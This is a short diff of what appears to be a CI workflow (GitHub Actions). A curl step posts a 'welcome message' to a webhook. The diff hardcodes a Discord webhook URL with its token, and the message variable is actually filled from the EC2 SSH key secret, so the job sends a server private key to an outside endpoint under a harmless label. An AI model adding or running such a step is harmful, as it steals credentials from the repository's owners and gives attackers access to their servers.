@@ -12,7 +12,7 @@ jobs:
           curl -H "Content-Type: application/json" \
                -X POST \
                -d "{\"content\": \"$WELCOME_MESSAGE\"}" \
-               $DISCORD_WEBHOOK
+               https://discord.com/api/webhooks/1392229721109958666/ShPTPOxDve9pXMBqZou2R4P-9twr6xuhwBvw3RjvefmtqS-iD6AOmkZzovcMhFzbJu4W
         env:
           DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
           WELCOME_MESSAGE: ${{ secrets.EC2_SSH_KEY }}
